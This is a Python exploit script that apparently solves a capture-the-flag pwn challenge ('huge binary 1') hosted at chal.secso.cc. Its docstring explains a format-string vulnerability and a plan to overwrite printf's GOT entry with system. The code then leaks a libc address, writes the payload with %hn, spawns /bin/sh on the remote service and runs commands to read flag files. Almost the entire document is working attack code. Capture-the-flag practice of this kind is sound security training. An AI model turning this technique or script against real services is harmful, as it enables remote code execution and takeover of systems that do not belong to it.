#!/usr/bin/env python3
"""huge binary 1 -- format string GOT overwrite: printf -> system.

main() gives three primitives:

    scanf("%d", &idx);  printf("...0x%llx", *(long*)(rbp + idx*8 - 8));  // arbitrary stack read
    scanf("%s", rbp-0x90);   // unbounded
    scanf("%s", rbp-0x110);  // unbounded
    printf(rbp-0x90);  printf(rbp-0x110);   // both user-controlled format strings

A plain ret2libc does not work: scanf("%s") cannot write NUL bytes, so only one
6-byte address can ever be planted (the terminator supplies byte 6 and byte 7 is
already zero).  That would need a one_gadget, and glibc 2.41 has none -- system()
now goes through posix_spawn, and every execve call site needs preloaded registers.

So use the format strings instead.  The binary is non-PIE, so printf@GOT is at the
fixed address 0x403390, and %n writes the NUL bytes for us:

  * printf(buf1) overwrites printf@GOT with system
  * printf(buf2) is therefore system(buf2), with rdi already pointing at buf2

Planting the 0x403390 pointer needs a qword whose top 5 bytes are zero.  The stack
read oracle shows buf1+0x18 holds 0x10 before main touches it, so writing the three
bytes 90 33 40 there and letting scanf's terminator land on byte 3 leaves exactly
0x0000000000403390.

Offsets measured against the live service:
    %6$  = [rbp-0x120] (argv)     %8$  = buf2     %24$ = buf1
    buf1+0x18 -> %27$            idx=2 -> saved return address = libc+0x29ca8
"""
import os
import re
import socket
import sys
import time

HOST = os.environ.get("HB1_HOST", "chal.secso.cc")
PORT = int(os.environ.get("HB1_PORT", "4002"))

RET_OFF = 0x29CA8      # __libc_start_call_main+0x78, where main returns to
SYSTEM = 0x53110
PRINTF = 0x59900
GOT_PRINTF = 0x403390
PTR_SLOT = 27          # positional index of buf1+0x18


def attempt():
    s = socket.create_connection((HOST, PORT), timeout=15)
    s.settimeout(8)
    pending = bytearray()

    def until(tok):
        # Keep the leftovers: the prompts arrive glued to the previous reply.
        while tok not in pending:
            c = s.recv(4096)
            if not c:
                raise EOFError
            pending.extend(c)
        i = pending.index(tok) + len(tok)
        out = bytes(pending[:i])
        del pending[:i]
        return out

    until(b"index: ")
    s.sendall(b"2\n")
    leak = int(re.search(rb"0x([0-9a-f]+)", until(b"\n")).group(1), 16)
    base = leak - RET_OFF
    if base & 0xFFF:
        s.close()
        return None, f"bad leak 0x{leak:x}"

    # A single %hn only rewrites the low two bytes, so printf and system must
    # agree above bit 16 for this base -- otherwise reconnect for a new one.
    if (base + PRINTF) >> 16 != (base + SYSTEM) >> 16:
        s.close()
        return None, f"base 0x{base:x} needs a 3rd byte"

    n = (base + SYSTEM) & 0xFFFF or 0x10000
    fmt = b"%%1$%dc%%%d$hn" % (n, PTR_SLOT)
    assert len(fmt) <= 0x18, fmt
    buf1 = fmt.ljust(0x18, b"A") + GOT_PRINTF.to_bytes(3, "little")

    until(b"echoed: ")
    s.sendall(buf1 + b"\n")
    until(b"echoed: ")
    s.sendall(b"/bin/sh\n")
    time.sleep(1.0)
    s.sendall(b"cat /flag /flag.txt 2>/dev/null; id\n")

    out = b""
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            out += c
    except socket.timeout:
        pass
    s.close()
    return out, f"base=0x{base:x} system=0x{base + SYSTEM:x}"


for i in range(1, 25):
    out, note = attempt()
    print(f"[{i}] {note}")
    if out is None:
        continue
    m = re.search(rb"(K17\{[^}]*\}|SCONES\{[^}]*\})", out)
    if m:
        print("[+] FLAG:", m.group(1).decode())
        sys.exit(0)
    if b"uid=" in out:
        print("[!] shell but no flag:\n", out[-800:].decode(errors="replace"))
        sys.exit(1)
sys.exit("[-] exhausted attempts")
